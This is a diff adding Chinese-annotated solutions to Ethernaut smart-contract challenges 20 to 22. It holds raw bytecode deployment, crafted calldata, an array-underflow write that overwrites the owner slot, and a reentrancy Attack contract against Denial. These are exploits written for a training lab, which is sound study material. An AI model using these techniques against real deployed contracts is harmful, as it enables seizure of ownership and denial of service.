@@ -385,12 +385,88 @@ contract RecoveryPoc {
 
 }
 
+### 20.MagicNumber
+##### 转账函数
+web3.eth.sendTransaction({from:player,data:bytecode},function(err,res){console.log(res)})
+var bytecode = "0x600a600c600039600a6000f3602A60805260206080f3"; 
+web3.eth.sendTransaction({from:player, data:bytecode}, function(err,res){console.log(res)}); 
+await contract.setSolver("0xccb446cbcd073320dfb8487cfcab02aeeb0aeee6");
 
+### 21.Alien Codex
+sig = web3.sha3("make_contact(bytes32[])").slice(0,10)
+// "0x1d3d4c0b"
+// 函数选择器
+data1 = "0000000000000000000000000000000000000000000000000000000000000020"
+// 除去函数选择器，数组长度的存储从第 0x20 位开始
+data2 = "1000000000000000000000000000000000000000000000000000000000000001"
+// 数组的长度
+await contract.contact()
+// false
+contract.sendTransaction({data: sig + data1 + data2});
+// 发送交易
+await contract.contact()
+// true
+##### 首先通过调用 retract()，使得 codex 数组长度下溢。
+web3.eth.getStorageAt(contract.address, 1, function(x, y) {alert(y)});
+// codex.length
+// 0x0000000000000000000000000000000000000000000000000000000000000000
+await contract.owner()
+// "0x73048cec9010e92c298b016966bde1cc47299df5"
+contract.revise('35707666377435648211887908874984608119992236509074197713628505308453184860938','0x000000000000000000000001a61cfd1573fd2207dcb1841cedcb1d5aed4dc155')
+// 调用 revise()
+await contract.owner()
+// "0x676ca875027fd9a5bdbd4f1f0380d8f34d8e1cdf"
+// Submit instance
 
+### 22.Denial
+##### 重入漏洞攻击
+pragma solidity ^0.4.23;
 
+contract Denial {
 
+    address public partner; // withdrawal partner - pay the gas, split the withdraw
+    address public constant owner = 0xA9E;
+    uint timeLastWithdrawn;
+    mapping(address => uint) withdrawPartnerBalances; // keep track of partners balances
 
+    function setWithdrawPartner(address _partner) public {
+        partner = _partner;
+    }
 
+    // withdraw 1% to recipient and 1% to owner
+    function withdraw() public {
+        uint amountToSend = address(this).balance/100;
+        // perform a call without checking return
+        // The recipient can revert, the owner will still get their share
+        partner.call.value(amountToSend)();
+        owner.transfer(amountToSend);
+        // keep track of last withdrawal time
+        timeLastWithdrawn = now;
+        withdrawPartnerBalances[partner] += amountToSend;
+    }
+
+    // allow deposit of funds
+    function() payable {}
+
+    // convenience function
+    function contractBalance() view returns (uint) {
+        return address(this).balance;
+    }
+}
+
+contract Attack{
+    address instance_address = instance_address_here;//根据示例来更改该参数
+    Denial target = Denial(instance_address);
+
+    function hack() public {
+        target.setWithdrawPartner(address(this));
+        target.withdraw();
+    }
+
+    function () payable public {
+        target.withdraw();
+    } 
+}
 
 
 
